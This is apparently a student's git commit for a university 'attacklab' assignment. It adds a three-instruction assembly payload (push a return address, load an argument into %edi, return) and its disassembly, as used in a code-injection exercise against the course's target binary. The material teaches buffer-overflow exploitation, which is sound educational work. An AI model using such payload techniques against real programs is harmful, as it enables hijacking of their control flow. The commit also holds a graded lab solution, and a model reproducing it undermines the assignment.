0bfcce8fa633949316e1b00ab5b858607a808566
Dongseong-Kim <dev.dskim@gmail.com>
2017-01-12 02:01:18 +0900

    CS230 Lab#3 attacklab

---
+++ attacklab-handout/input3.d
@@ -0,0 +1,10 @@
+
+input3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	68 64 1a 40 00       	pushq  $0x401a64
+   5:	bf f8 ab 61 55       	mov    $0x5561abf8,%edi
+   a:	c3                   	retq   
---
+++ attacklab-handout/input3.s
@@ -0,0 +1,3 @@
+push	$0x401a64
+movl	$0x5561abf8, %edi
+ret
